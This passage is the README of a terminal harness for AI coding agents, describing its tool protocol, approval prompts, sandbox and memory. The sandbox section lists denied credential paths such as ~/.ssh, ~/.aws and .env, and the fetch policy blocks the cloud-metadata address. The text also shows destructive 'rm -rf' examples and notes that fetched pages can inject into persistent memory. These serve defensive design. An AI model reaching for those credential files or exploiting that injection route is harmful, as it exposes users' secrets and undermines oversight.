# ai-harness

A terminal agent harness for models served through [OpenRouter](https://openrouter.ai).
The prompt box is pinned to the bottom of the screen; the conversation scrolls above it.

## The protocol

Input is not sent as free text. Each prompt goes out wrapped in a single element:

```xml
<ai-harness-query>count the rust files in src</ai-harness-query>
```

The model must reply with exactly one of nine elements, and nothing else:

```xml
<ai-harness-shell>ls -1 src/*.rs | wc -l</ai-harness-shell>
```

```xml
<ai-harness-shell background=true>cargo test</ai-harness-shell>
```

```xml
<ai-harness-read>src/app.rs</ai-harness-read>
```

```xml
<ai-harness-read offset=1587 limit=400>src/app.rs</ai-harness-read>
```

```xml
<ai-harness-grep>fn parse_reply</ai-harness-grep>
```

```xml
<ai-harness-grep dir=src glob="*.rs">(?i)todo</ai-harness-grep>
```

```xml
<ai-harness-glob>**/*.rs</ai-harness-glob>
```

```xml
<ai-harness-fetch>https://doc.rust-lang.org/std/net/enum.IpAddr.html</ai-harness-fetch>
```

```xml
<ai-harness-edit file=src/app.rs>
<ai-harness-old>let x = 1;</ai-harness-old>
<ai-harness-new>let x = 2;</ai-harness-new>
</ai-harness-edit>
```

```xml
<ai-harness-write file=src/hello.rs>
fn main() { println!("hi"); }
</ai-harness-write>
```

```xml
<ai-harness-option>
<ai-harness-option-question>Which database should the schema target?</ai-harness-option-question>
<ai-harness-option-choice>Postgres</ai-harness-option-choice>
<ai-harness-option-choice>SQLite</ai-harness-option-choice>
</ai-harness-option>
```

```xml
<ai-harness-response>
<ai-harness-response-text>There are 8 Rust source files.</ai-harness-response-text>
<ai-harness-memory/>
</ai-harness-response>
```

Every response says what to remember — either the empty form above, meaning
"considered, nothing durable", or a note to keep. `<ai-harness-memory>` may ride
on **any** element but a write, at the very start or end of its body, so a note
can be recorded on the next action rather than held until the answer. See
[Project memory](#project-memory).

```xml
<ai-harness-response>
<ai-harness-response-text>Here's how src/ is laid out…</ai-harness-response-text>
<ai-harness-memory name=architecture
    description="how src/ is laid out and which module owns what">
One tokio::select! loop in main.rs owns every session…
</ai-harness-memory>
</ai-harness-response>
```

The contract is sent as the system prompt on every request, and replies are
validated strictly — prose around the tag, a markdown code fence, two elements,
an unknown tag, an attribute where none is allowed, or an empty body are all
rejected rather than guessed at, so protocol drift surfaces immediately. A
rejected reply is shown in the transcript as a `protocol error` alongside the raw
text the model actually sent.

A shell command or file write runs only after you approve it, and its result is
fed back (`<ai-harness-shell-result>` / `<ai-harness-write-result>`), so the model
can keep working until it returns a final response. `<ai-harness-write>` replaces
the whole named file; its contents are preserved byte-for-byte (only the single
formatting newline after `>` is stripped).

`<ai-harness-read>` is the exception: it mutates nothing, so it runs immediately
with **no approval prompt** and the contents come straight back as
`<ai-harness-read-result>`. It takes an optional line window — `offset=` is the
first line, counting from 1, and `limit=` is how many lines to return. A file too
big for one read says which lines it gave you and names the read that continues
it, so the tail of a large file is reachable rather than permanently cut off. That is the point of having it as its own element
rather than leaving reads to `cat` — an agent that wants to look at four files
before doing anything should not interrupt you four times first. It earns that
by being confined more tightly than the shell is: reads resolve to a real path
inside the working directory or they fail. To read anything outside, the model
has to use `<ai-harness-shell>`, which you approve as usual. Pass
`--confirm-reads` to put reads behind the modal too.

`<ai-harness-grep>` and `<ai-harness-glob>` finish the thought the read started.
A read is auto-approved because looking at four files should not cost four
interruptions — but *finding* those four files meant `<ai-harness-shell>rg …`,
which interrupts, so the free path was only reachable through a modal. Search
mutates nothing and confines exactly as a read does, so it earns the same
treatment on the same argument.

A grep's body is a regular expression and a glob's is a filename pattern (`*`
within one path segment, `**` across them, `?` for one character). Both take an
optional `dir=` to scope the walk; a grep also takes `glob=` to filter which
files it opens. There is no `case=`, because `(?i)` at the front of the pattern
already says it and says more.

Results come back as `path:line: text` — what `rg -n` prints, so it is the shape
a model has seen most — with the path relative to the working directory, so a
hit can be handed straight to `<ai-harness-read>` without translation. Finding
nothing is reported as `matches: none` rather than an empty section: silence is
the one answer a model reliably misreads as breakage.

The confinement is the read's, applied per entry instead of once. Every file and
directory the walk touches is checked against the credential denylist, because a
glob of `**/*` that consulted it only for the starting directory would list
`.env`. Symlinks are never followed, which stops an escape out of the root, a
link back in that double-reports, and `a -> .` looping forever, all with one
rule. A hardcoded list keeps the walk out of `.git`, `target`, `node_modules`
and the like — that one is about cost rather than safety, though `.ai_harness`
is on it for a sharper reason: a session file holds an entire prior
conversation, so without it a grep would match the transcript of you typing the
thing you searched for and hand it back.

Searches are bounded on five axes — matches, files walked, per-file size, output
bytes, and wall clock — and a search that stops early says which cap it hit and
how to narrow it, the way a partial read names the read that continues it.
`--confirm-reads` covers searches as well as reads; a search has no flag of its
own, since a modal showing a *pattern* tells you less than one showing a path.

`<ai-harness-fetch>` is auto-approved on the same reasoning — an agent that
wants to check three documentation pages should not interrupt you three times —
but it earns it differently, and the difference matters. A read is *more*
confined than the shell. A fetch cannot be: it is an outbound request to a host
the model picked. What bounds it is a policy on the destination rather than a
filesystem root: **https only**, and **no addresses on this machine or this
network** — loopback, private, link-local (including the `169.254.169.254`
cloud-metadata endpoint), and the other special-purpose ranges are all refused.

That check runs inside the HTTP client's own DNS resolver, not as a lookup
beforehand. Checking first and connecting after leaves a DNS-rebinding race,
because the client resolves again when it connects; and pinning the first
address does not help, because a redirect resolves a fresh host. As the
resolver, the check is the one thing every hop and every new connection must
pass through. Redirects are capped and each hop's URL is re-checked.

The page comes back as text, not HTML: script, style, and navigation subtrees
are dropped, block tags become line breaks, and entities are decoded — a real
documentation page arrives as ~18 KB of readable text instead of ~125 KB of
markup. `<pre>` is the exception to the flattening and keeps its line breaks and
indentation, because in a coding harness the code examples are usually the point
of the page. Non-HTML content types (JSON, Markdown, plain text) pass through
untouched. Pass `--confirm-fetch` to put fetches behind the modal.

To be straight about what this is worth: on macOS you could get comparable text
out of `curl -s URL | textutil -convert txt -stdin -stdout`, and the shell
already bounds output and time. What the element actually buys is that it runs
**without interrupting you**, that the model reaches for it reliably from the
contract instead of having to remember a two-command pipeline, and that a
refusal comes back as something it can act on rather than a shell exit code.
The destination policy above is the price of that first property — take
auto-approval away and most of it would be redundant with the modal.

`<ai-harness-edit>` changes part of a file by exact search-and-replace: the
`<ai-harness-old>` text must appear **exactly once** in the file, and it is
swapped for `<ai-harness-new>` (an empty `<ai-harness-new>` deletes it). This is
how the model should change an existing file — it costs tokens proportional to
the change, not the whole file, and it cannot silently drop the parts it did not
mean to touch, the way a full rewrite can. If the old text is missing or
ambiguous, the edit is **rejected before you ever see a modal** and handed back
to the model to fix; you are only asked to approve edits that will actually
apply, and the approval shows a `-`/`+` diff. Under the hood an approved edit
runs as an ordinary sandboxed write of the whole resolved file, so nothing about
the confinement changes. `<ai-harness-write>` is still there for creating a new
file or a deliberate full rewrite.

`<ai-harness-option>` is the model asking *you* something. It could already ask a
question by putting one in `<ai-harness-response>` — but that **ends the turn**, so
answering meant typing a fresh prompt and the model resumed from a standing start.
That cost pushes a model toward guessing on exactly the decisions worth stopping
for. This makes asking cheap: the question comes up as a modal, `↑`/`↓` or `1`-`9`
picks an answer, `Enter` sends it, and **the loop carries straight on** — the
answer goes back as a result like any other.

A final row lets you type an answer that was not offered, and the model is told
which happened: picking one of its choices and writing your own mean different
things, and the second says its options were wrong. `Esc` dismisses the question,
which is also reported, so the model proceeds with a stated assumption rather than
stalling on an answer that is never coming.

Two properties worth knowing. A question is **never auto-approved**: it is not an
approval, so `--auto-approve` cannot see it and cannot answer for you — the one
thing in the protocol that always reaches a person. And an
`<ai-harness-option-result>` written by the model is rejected as fabrication, the
same as any other invented result; putting words in your mouth is the version of
that failure worth guarding hardest.

A `<ai-harness-response>` renders as **markdown** — headings, bullet and numbered
lists, blockquotes, rules, inline code, bold and italic, links, and fenced code
blocks, which get the same syntax highlighting a write or an edit does. Models
write markdown whether or not anything renders it, so the alternative was leaving
`##` and `**` on screen as punctuation.

It is a subset, hand-rolled like the wrapping and highlighting: nested emphasis,
reference links, setext headings, tables, and HTML are not parsed and render as
literal text rather than breaking. Only responses go through it — a read or a
fetch stays verbatim, because when you ask to see a file you want its source. The
raw reply is always available in the `/debug` frames, which are recorded whether
or not debug is on.

If a reply fails validation, the harness tells the model exactly what was wrong
and asks again, up to `--max-retries` (default 3). After that it gives up and
rolls the failed exchange out of context, so a bad reply is not left behind as an
example to imitate. Retries are always on; `/debug` only changes what you see.

One failure is recovered instead of retried: a sentence of narration in front of
an otherwise valid element. It is the commonest slip by a wide margin and the
least interesting — the action was right — so the prose is dropped, the action
runs, and the transcript says how much was dropped. Nothing else is forgiven: the
element behind the prose still has to parse on its own, and trailing content, two
elements, an invented result, or an attribute the element does not take are all
rejected as before. `--strict-replies` turns the recovery off.

## Reasoning

Models that stream their reasoning have it shown, dimmed, in a capped window
above the reply as it arrives:

```
┌─ ⠋ reasoning ────────────────────────────────────
│ ⋯ 14 earlier line(s)
│ Keying on the path alone would retire a read of a
│ different part of the same file.
│ I should read the function before answering.
└──────────────────────────────────────────────────
```

Without this a reasoning model leaves you watching a `thinking…` spinner for a
minute or more while the API is streaming text the whole time that says what it
is doing. The window is capped and reports what scrolled past, for the same
reason a running command's output is: a trace can be far larger than the screen,
and the newest part is the part worth seeing.

The trace is a live view and nothing else. It is **never parsed** — it does not
go near the protocol — **never sent back** to the model, and **never saved** with
the session. It is gone the moment the reply lands, and it is gone on a cancel or
an error too. What a model reasoned is not what it said, and the harness keeps
only what it said.

`/reasoning` toggles the window and `--no-reasoning` starts with it hidden. Both
govern drawing only: the text still arrives and is still buffered, so turning it
back on mid-turn shows the trace so far rather than picking up from wherever the
model has got to.

## Slash commands

Commands are handled locally and never sent to the model.

| Command | Action |
| --- | --- |
| `/debug` | Toggle showing the raw protocol sent and received |
| `/auto` | Toggle running actions without the approval modal (see [Sandboxing](#sandboxing)) |
| `/reasoning` | Toggle showing the model's reasoning while it streams (see [Reasoning](#reasoning)) |
| `/plan [task]` | Toggle plan mode; with a task, start planning it (see [Plan mode](#plan-mode)) |
| `/clear` | Clear the conversation, keeping the system prompt |
| `/compact` | Summarise the older part of the conversation to free context (see [Context compaction](#context-compaction)) |
| `/undo` | Put back the files the last changing turn touched (see [Checkpoints and undo](#checkpoints-and-undo)) |
| `/rewind` | Choose how far back to undo, from a list of the conversation |
| `/sessions` | Switch between running sessions, or start one (also `Ctrl+Space`) |
| `/memory` | List the project's notes and what the index made of them (see [Project memory](#project-memory)) |
| `/jobs [kill <id>]` | List background jobs, or stop one (see [Background jobs](#background-jobs)) |
| `/stats` | A page of what this session has done, including how memory was used |
| `/checkpoints [n]` | List what can be undone; with a number, keep only the last `n` turns |
| `/save [name]` | Save the session now (auto-save is always on; this also names it) |
| `/load [name]` | Load a saved session; `/load` with no name opens a picker modal |
| `/rename <name>` | Rename the current session (the name it loads under) |
| `/fork [name]` | Branch into a new session, freezing the original |
| `/cost` | Cumulative tokens, time spent waiting, and estimated spend |
| `/model [id]` | Choose the model; `/model` with no id opens a picker (see [Choosing a model](#choosing-a-model)) |
| `/help` | List the commands |
| `/quit` | Exit |

Typing `/` opens a completion menu above the prompt, narrowing as you type:

| Key | Action |
| --- | --- |
| `Tab` | Complete to the highlighted command |
| `↑` / `↓` | Move the highlight (wraps at both ends) |
| `Enter` | Run the highlighted command |

Because `Enter` runs the highlight, `/de` and `Enter` is enough — there is no
need to complete first. These keys only bind while the menu is open, so `Tab`
still indents and `↑`/`↓` are free otherwise. The menu lists canonical names
only; aliases (`/q`, `/h`, `/reset`, `/exit`) still work when typed in full.

An unrecognised command is reported rather than forwarded. Start a prompt with
`//` to send text that really does begin with a slash — which also suppresses
the menu.

`/debug` is a pure view toggle: frames are recorded whether or not it is on, so
turning it on reveals traffic that already happened rather than only what comes
next. `--debug` starts with it enabled.

```text
→ sent
<ai-harness-query>What is 2+2? Just answer.</ai-harness-query>

← received
<ai-harness-response>2+2 = 4.</ai-harness-response>
```

## Sandboxing

Commands run under macOS Seatbelt (`sandbox-exec`), rooted at the working
directory. Confinement is enforced by the kernel rather than by inspecting the
command text — a shell command is an arbitrary program, so no amount of string
validation makes it safe. Because the kernel checks the *resolved* path, symlink
escapes are covered too.

| | Policy |
| --- | --- |
| Writes | Confined to the working-directory subtree, plus the package-manager caches |
| Shell reads | Open, minus `~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.config/gh`, `~/.cargo/credentials.toml`, Keychains, `.env` |
| `<ai-harness-read>` | Working-directory subtree only, minus the same denylist |
| `<ai-harness-grep>` / `<ai-harness-glob>` | The same, checked per entry; symlinks never followed; build and dependency directories skipped |
| `<ai-harness-fetch>` | Public https hosts only; never this machine or this network |
| Network | Allowed — the approval prompt is the control point |
| Timeout | 30s by default, killing the whole process group |
| Output | Capped at 32 KB per stream; a read window at 64 KB |

The read element is deliberately stricter than the shell. It resolves the path
in process and refuses anything that lands outside the root — including a
symlink inside the root pointing out of it, because the check runs on the
*resolved* path, the same rule the kernel applies. Being auto-approved, it must
not be able to reach files you never agreed to send to OpenRouter; the denylist
is shared with the Seatbelt profile so the two cannot drift apart.

Writes reach outside the root in exactly one place: the package-manager caches
(`~/.cargo/registry`, `~/.npm`, `~/go/pkg/mod` and a handful of others — see
`CACHE_HOME_SUBPATHS` in [src/sandbox.rs](src/sandbox.rs)). Without them no build
command works at all; cargo keeps its downloaded crates there, and a denied write
surfaces as a bare `Operation not permitted` that reads as a broken toolchain
rather than as a policy decision. The allowance is scoped to the cache
directories, not to each tool's home: `~/.cargo/bin` holds the binaries you run
*outside* the sandbox, so it stays read-only. A cache is data the tool re-fetches
if it is corrupted — but it *is* shared with the rest of your machine, and a
build script that poisons one is not confined to this project. Plan mode grants
no cache writes: nothing can build under it regardless, since `target/` is inside
the root it has already frozen.

File writes go through the same Seatbelt confinement: the harness runs `tee` under
the sandbox with the path passed as an argv element (never shell text, so it
cannot inject) and the contents piped on stdin. A write outside the root is denied
by the kernel and reported as an error, never an escape.

By default every command, write, and edit is shown in an approval modal before it
runs. `←`/`→` move between Allow and Deny, `Enter` confirms, `y`/`n` are
shortcuts, and the buttons are clickable. Denial is reported to the model so it
can propose something else. An edit is resolved against the file *before* the
modal, so you are never asked to approve one that cannot apply.

Writes and edits are shown as a diff, syntax-highlighted for the language the
file extension implies:

```
rust · +1 -1
  fn main() {
-     println!("one");
+     println!("two");
  }
```

Unchanged lines are kept for orientation and elided once they are far from
anything that moved, so a one-line change in a large rewrite reads as a one-line
change. A write is diffed against the file it replaces — the harness reads the
target during pre-flight purely to show you this, which is not an
`<ai-harness-read>` and is never shown to the model. A brand-new file has no
"before", so it falls back to a bounded preview of what it will contain.

The same block is used by the modal and the transcript, which matters most under
`--auto-approve`: with no modal, the transcript is the only place a change is
ever seen.

`--auto-approve` (or `/auto` mid-session) skips the modal: actions run as soon as
the model proposes them, still inside the sandbox. It is meant for a long
unattended task, where a twenty-step refactor is otherwise twenty keypresses. The
transcript still records every action and its result, so you review after the fact
instead of before it, a red `auto-approve` marker sits in the status bar for as
long as the mode is on, and `Esc` still cancels whatever is running. **Read the
paragraph below on what it gives up before leaving it on.**

A command's output streams into an outlined window while it runs, so a slow build
looks different from a hang:

```
┌─ ⠋ cargo build --release ──────────────────────────────────
│    Compiling ai-harness v0.1.0
│ warning: unused variable `x`
│     Finished in 3.4s
└─ Esc cancels ──────────────────────────────────────────────
```

stderr shows in red, the newest output is kept when there is more than fits, and
the window is replaced by the ordinary result entry when the command exits. The
live view is display-only — the text sent to the model is the complete output
captured at the end, the same split streamed replies use.

A command's stdin is `/dev/null`, so there is nothing to type at while one runs:
anything waiting to be answered hits EOF and fails immediately rather than
sitting there. A command that needs an answer should be given it upfront — `yes |`,
`--yes`, or a heredoc — and when the *model* needs an answer it asks with
`<ai-harness-option>` instead, which works at any point rather than only while a
command happens to be running.

`--command-timeout` is an **idle** bound, not a total one: it resets whenever the
command produces output, so a command is killed after that long doing nothing
rather than that long running. A build that prints progress
for two minutes survives; a silent one still dies on schedule. A separate ceiling
of twenty times the timeout (ten minutes by default) stops a command that prints
forever from running forever.

The agentic loop is bounded by `--max-iterations` so a model that keeps proposing
actions cannot spin forever; reads and edits count against it like anything else.
It is bounded by `--max-turn-bytes` as well, because round-trips are the wrong
unit for the damage a few whole-file reads can do: a handful of them can crowd
out the context window well inside the round-trip budget.

## Project memory

Two tiers of standing knowledge about the project, differing in *when* the bytes
reach the model.

### `AGENTS.md` — always loaded

An `AGENTS.md` in the working directory is appended to the contract, in its own
section, on every request. It is for what changes *how* the model works: build
commands, house style, what not to touch.

It sits **beside** `--system`, never instead of it. The two have different
provenance — one is whoever launched the harness this time, the other is how the
project is worked on regardless — and the contract labels them separately so the
model can tell. Capped at 16 KB and truncated with a marker if it is longer,
because the contract goes out again on every round-trip of an agentic turn: a
large file is paid for ten times in a turn that runs ten commands.

### `.ai_harness/memory/` — an index loaded, bodies on demand

Notes that outlive a session. One markdown file each, with a description in
frontmatter:

```markdown
---
description: how sessions are validated — read before touching anything under auth/
---

Long-form notes…
```

Only the **names and descriptions** go into the contract:

```
Project memory — notes kept from earlier sessions, in .ai_harness/memory:

  auth-flow.md — how sessions are validated; read before touching auth/
  deploy.md — the staging deploy sequence and its gotchas
```

The body enters the conversation only when the model decides a description is
relevant and opens the file with `<ai-harness-read>`. That is the whole point: a
note costs about fifteen tokens standing and its real size only when it is used,
so forty notes are affordable where forty pasted-in documents are not.

Write the description as *when you would want this*, not as a title. "Auth
architecture" is a bad description; the one above is a good one — it is the only
thing the model sees, and it is what decides whether the note is ever read. **A
file with no `description:` is left out of the index entirely**, since an entry
that cannot earn its line is dead weight in a budget paid on every request.

### How a note gets written

**The model attaches one to a reply it was making anyway**, with
`<ai-harness-memory>`. That is the only way it can keep a note, and it is
deliberate: a note written as a *separate* action would cost a round-trip out of
the agentic budget and a second approval, which is what made keeping them too
expensive to bother with. Riding on a reply costs neither.

The element may go on **any element but a write**, at the very start or the very
end of the body — never the middle, so a grep pattern or an edit span that merely
mentions the tag keeps it. A write is excluded because its body is the file's
exact bytes, and carving an element out of them would corrupt a file that begins
or ends with one. That matters here: this harness edits its own source.

Allowing it anywhere is what puts capture at the moment of learning. A note about
what a read established can ride on the *next* action rather than waiting for the
answer, by which point the model is composing prose and the detail has faded.

**A response must carry one**, which is the part that made memory actually
happen — offering was not enough, and a session that read seven files and
summarised them kept nothing. `<ai-harness-memory/>` with no attributes satisfies
it and means "considered, nothing durable this turn". Requiring the *element*
rather than a *note* is the whole design: a model told it must produce a note
will produce one, and a directory of notes about arithmetic is worse than an
empty directory. `--no-require-memory` turns the requirement off if the
corrective round-trips cost more than the notes are worth; `/stats` is how you
tell.

**It is written without asking**, and the containment is what makes that
defensible rather than alarming: the model supplies a **name**, never a path. The
harness sanitises it, appends `.md`, and joins it to the memory directory, so
there is no value it can send that writes anywhere else. `description` is a
required attribute, so the harness builds the frontmatter itself and a note that
cannot be indexed is impossible to express. `/memory` and `/stats` are the audit
surfaces, and a note you did not want is one `rm`.

In [plan mode](#plan-mode) a note is dropped rather than written, with a notice
saying so — the mode's promise is that nothing but the plan is written, and it is
enforced by the kernel besides.

Writing a note by hand with `<ai-harness-write>` still works, and is still
checked: one into the memory directory with no `description:` is refused before
you are asked about it, since otherwise it would be written, approved, and then
silently never listed. An edit that strips the description out of an existing
note is refused on the same rule. Both use the same parser the index does, so the
two cannot disagree about what counts as a note.

The index is capped at 128 entries and 8 KB. Over that, the least recently
changed drop out and the section says how many went, so a partial list looks
partial. `/memory` lists every note, marks the ones the index left out, and names
files skipped for a missing description — which is how you find rot.

**`/stats` is how you tell whether a description is earning its line.** Its
Memory section counts reads and writes for the session and then names the notes
that went *unread*:

```
Memory
  indexed   3 note(s)
  read      2 read(s) across 1 note(s)
  written   0
  unread    ci.md, deploy.md
```

A note that is indexed and never opened is paying for a line in the contract on
every request and buying nothing — almost always because its description says
what the note is rather than when you would want it. The numbers are derived
from the transcript, so they cover this conversation only, and `/rewind` rewinds
them along with everything else.

Three things worth knowing:

- **`/undo` does not cover memories.** Checkpoints skip `.ai_harness/` so that a
  snapshot cannot swallow session transcripts and the checkpoints themselves, and
  memories live inside it. They are ordinary files; delete a bad one.
- **The model cannot grep or glob the memory directory**, for the same reason.
  The index is the entire discovery path.
- **Memory is an injection surface.** Something the model read from a fetched
  page can end up in a file loaded into every later session. The approval modal
  is the check on that.

## The project check

Without this, a turn ends on the model's word. It says "fixed", the turn ends,
and you find out later. The check gives something else the last say.

**It is on by default** wherever the project's check can be inferred. In a Cargo
repository the harness runs `cargo check --all-targets` without being asked, and
says so at startup:

```
Project check: `cargo check --all-targets` — it runs after any turn that writes
a file, and a failure goes back to the model.
```

What gets inferred, first match winning:

| At the working directory | Check |
| --- | --- |
| `Cargo.toml` | `cargo check --all-targets` |
| `go.mod` | `go build ./...` |
| `package.json` with a `typecheck` script | `npm run typecheck` |
| `package.json` with a `check` script | `npm run check` |
| anything else | none |

Deliberately short. A default that guesses wrong is worse than none — it fails
confidently about code that is fine — so an unrecognised project simply gets no
check, and says *that* at startup instead. `build` and `test` scripts are left
out for the same reason: too slow, and `build` leaves artifacts. Both are fine
things to choose yourself.

To choose or disable:

```bash
cargo run -- --check "just lint"
```

```bash
cargo run -- --no-check
```

`--no-check` wins over `--check`, which wins over what was inferred.

Any turn that **wrote a file** runs that command before it is allowed to end.
You watch it in the same live window an approved command uses. If it passes, the
turn ends as normal. If it fails, the output goes back to the model as a result
and it keeps working:

```
write  src/parser.rs
response  "Fixed the offset handling."
check  exit 1
       error[E0308]: mismatched types
edit   src/parser.rs
response  "That was a type error on my side — fixed."
check  exit 0
```

**It is not approved.** Every other command the harness runs was proposed by the
model, which is what the modal is for. This one you typed into your own
configuration — setting the flag is the approval. It still runs in the sandbox.

**Prefer something fast.** It is paid on every writing turn, so a type check, a
lint, or one focused test target pays for itself where a full suite turns a
one-line edit into a two-minute wait.

Four things worth knowing:

- **There is no retry cap.** A failing check feeds the loop for as long as the
  model keeps changing files — the existing `--max-iterations` budget is the only
  bound. What stops a model with no ideas left is that **a response which writes
  nothing ends the turn**, so it can look at a failure, decide it is not its
  doing, say so, and stop. The result it is shown says exactly that.
- **If the budget runs out with the check still failing**, the check still runs
  and you are told. The budget gates whether the model gets asked about it, not
  whether you find out.
- **Shell-driven edits do not trigger it.** The trigger is a write or an edit, so
  a turn that changes files by running `sed -i` or `cargo fix` slips past.
  Including shell commands would fire the check after `ls` and after most turns
  that change nothing.
- **Plan mode does not trigger it.** Writing `plan.md` is a write like any other,
  but a plan is prose and there is nothing to compile.

The check is not counted in `/stats` — that page is what the model did, and this
is something the harness did on its own.

### The model is also asked to check

The machinery above is the floor, not the whole story. It can only run one
configured command, and only after a write — it will not make a model check its
work *during* exploration, or pick a better check than the configured one.

So the system prompt asks for it directly: a change is not finished until it has
been checked, find the project's own check rather than guessing a command, prefer
the cheapest one that would catch the mistake, and — the sentence doing the real
work — **if you did not check, say so**. Never report success you have not
observed. A turn where checking was not worth it is fine; a turn that claims
success it never saw is not, because nobody reading the transcript can tell the
difference.

The two overlap: a model that follows the prompt runs `cargo check`, then the
harness runs it again after the response. That is cheap — a warm re-check of a
Bevy project measured 0.43s — and they are doing different jobs. The model's run
catches mistakes while they are still cheap to fix; the harness's run is the gate
that catches what the model skipped.

## Background jobs

A plain `<ai-harness-shell>` holds the turn open until the command exits. That is
right for `ls` and wrong for `cargo test`, a build, or a dev server. Adding
`background=true` starts the command and lets the turn carry on:

```xml
<ai-harness-shell background=true>cargo test --all</ai-harness-shell>
```

It is approved through the ordinary modal — a job is still a shell command, and
running unattended does not skip the question. What comes back is a job id rather
than an exit code:

```
<ai-harness-shell-result>
status: started in the background as job 1786215831-000
note: the command is still running. Its output is being written to …
</ai-harness-shell-result>
```

Each job is a directory under `.ai_harness/jobs/`:

```
.ai_harness/jobs/1786215831-000/
    command   cargo test --all
    pid       48231
    stdout    appended as it runs, capped at 32 KB
    stderr
    status    running | exit 0 | killed | timed out | abandoned
    started   unix seconds
    ended
```

**The directory is the state.** Nothing about a job is cached in memory except
the handle needed to kill it, so a reloaded session, a second session, and a
restarted harness all read the same files and reach the same answer.

The model finds out two ways. Every prompt's contract carries a line per job —
rebuilt from disk like the memory index, so it cannot go stale and cannot be
forgotten — and it opens the logs with `<ai-harness-read>` when it wants detail.
Note that **a read reaches these files and a grep does not**: `.ai_harness/` is
skipped by search, because a session file holds a whole prior conversation and a
grep for anything you have typed would match the transcript of you typing it.
Each log is capped well inside what one read returns, so nothing is lost.

`/jobs` lists them, `/jobs kill <id>` stops one. Both work mid-turn, since a job
is not part of a turn.

Four things worth knowing:

- **A job has no idle timeout.** `--command-timeout` kills a foreground command
  that goes quiet, which is exactly wrong for a server that logs on startup and
  then waits. A job gets a wall-clock `--job-ceiling` instead — an hour by
  default.
- **Four at once**, and past that the model is told so and can wait or run the
  command in the foreground. The cap is about legibility more than resources: the
  contract carries a line per job on every round-trip.
- **`/undo` and `/rewind` refuse while a job is running.** A checkpoint is taken
  before an action runs and a job keeps writing after that, so restoring would
  leave neither the old tree nor the new one.
- **Jobs do not survive the harness.** Quitting kills them, and anything a
  previous run left marked `running` is written off as `abandoned` at startup —
  otherwise the contract would claim a process that is gone.

## Sessions

`Ctrl+Space` — or `/sessions` — opens a list of every conversation the harness is
running. **`Ctrl+T` opens it too**, and is worth knowing about: macOS binds
`Ctrl+Space` to "select the previous input source" for anyone with more than one
keyboard layout, and the system takes the key before the terminal sees it.

```
┌ sessions ──────────────────────────────────────────────────────────
│  / to search
│  ⠋ session-1785873241        streaming  deepseek/deepseek-v4-pro  12 turns
│      you: add a checkpoint module
│      write src/checkpoint.rs
│      cargo test 2>&1 | tail -20
│
│    session-1785873999 ‹current›   ready  z-ai/glm-5.2              3 turns
│      you: why is retire_superseded_reads keyed on the range?
│      Because keying on the path alone would retire a read of a diff…
│
│› ! session-1785874100        needs you  deepseek/deepseek-v4-pro   7 turns
│      you: clean up the tmp directory
│      rm -rf tmp/*
│
│/ search · j/k · Enter switch · n new · l open saved · x shut down · Esc close
└────────────────────────────────────────────────────────────────────
```

Each session shows the last few things that happened in it, because which one is
busy is a column of names but *what with* is the thing you came back for. It
names actions as well as words: a session three commands into a build has said
nothing, and showing it blank would be the least useful thing on the screen.
Whatever is streaming or running this instant goes last, being the newest. It is
also what makes `!` actionable rather than alarming — the command waiting for
your approval is right there under the name.

`/` narrows the list, on the terms in [In any list](#in-any-list). It searches
the **activity** as well as the name and the model, unlike the `/load` picker:
every session here is called `session-<timestamp>`, so the name is the least
distinguishing thing about it, and `/ parser` finding the one that is working on
the parser is the whole point.

They run **at the same time**. A session you are not looking at keeps streaming
and keeps running commands, which is the point: you can leave one working through
something long and go do something else. The spinner in the list is that session
still going while you are away.

What a background session cannot do is ask you something. An approval belongs to
a screen, and it is not on screen — so one that proposes a command parks and is
marked `!`, and the status bar says how many are waiting on you. Under
auto-approve it carries on instead; that is the difference the setting makes, and
it is why the setting is per session.

**Settings travel with the conversation.** Auto-approve, `/debug`, `/reasoning`,
the model and the checkpoint retention all belong to a session, and a new one
inherits them from the session you spawned it from. So a session spawned from one
running unattended is also unattended, and one spawned from a careful session
also asks. Plan mode is the exception and is never inherited: it is a mode you
are in for a particular piece of work, and a new session is new work.

`x` shuts a session down. It is not destructive and so is not confirmed — the
conversation is saved on the way out and `/load` brings it back; what is lost is
a reply that was in flight, which cancelling would have lost anyway. The last
session cannot be shut down, since a harness with nowhere to type is not a state
worth having; `/quit` is how you leave.

The list shows sessions that are *running*. **`l` opens a saved one beside
them** — the picker with `Enter` meaning "open", so the picked session becomes a
slot of its own and nothing already running is disturbed. `/load` inside a
session keeps its own meaning, replacing that conversation; the two are different
operations rather than one with a surprising second mode. Picking a session that
is *already* running means the same thing from either, and is covered next.

**A session cannot be open in two slots at once** — both would auto-save to one
file and each would overwrite the other's turns. So the picker lists every saved
session and marks the running ones with a green `●`, in the same column the view
above puts `!` and the spinner; the one you are in also says `‹current›`:

```
┌ load session ─────────────────────────────────────────────────
│  / to search
│
│› ● auth-refactor  ‹current›            deepseek/deepseek-v4-pro
│  ─────────────────────────────────────────────────────────────
│    you: rework the token refresh
│
│  ● session-1785873241                  z-ai/glm-5.2
│  ─────────────────────────────────────────────────────────────
│    you: add a checkpoint module
│
│    old-experiment                      z-ai/glm-5.2
│● running · Enter switches to it · Esc cancel
└───────────────────────────────────────────────────────────────
```

`Enter` on a dotted row **switches to that session** rather than loading it, and
`/load <name>` naming a running one does the same. Nothing is refused: the
picker is the one place that answers "where is that session", whether the answer
is "loading it" or "over there". The footer says which of the two `Enter` will
do, because that differs per row.

### Picking up where you left off

The set of sessions you had open is recorded in
`.ai_harness/sessions/open.json`, and **launching reopens it**. Every session
already auto-saves, so what this adds is only the *set* — which was the tedious
half of starting again, since rebuilding it by hand meant `/load` once per
session.

When anything was reopened, the harness **starts on the sessions view** rather
than on a conversation, highlighting the one you were last in. Resuming work
begins with choosing which work, and dropping straight into whichever session had
focus would hide that there are others — which is what the view exists to show.
`Enter` takes the highlight and `Esc` closes it. A launch with nothing to reopen
starts at the prompt, as it always has.

The record names the project it belongs to, so pointing `--sessions-dir` at a
directory two projects share never reopens the other one's work. A session
deleted between runs is named in a notice rather than passed over. `--no-restore`
starts with one fresh session instead.

Two things they share, deliberately: the working directory and the sandbox.
Nothing isolates one session from another, and the boundary is still the project
root. **That has a sharp edge with checkpoints** — see the next section.

## Checkpoints and undo

The sandbox root is what commands are confined *to*, not protected from. An
auto-approved `rm -rf .` is entirely inside the boundary, and the kernel is right
to allow it. So before an approved action changes anything, the files it is about
to change are copied aside.

Two ways of filling a checkpoint, because two different things are knowable:

- A **write or edit** names its file, so exactly that file is copied. Exact, and
  nearly free.
- A **shell command** could touch anything, so the workspace is walked and copied
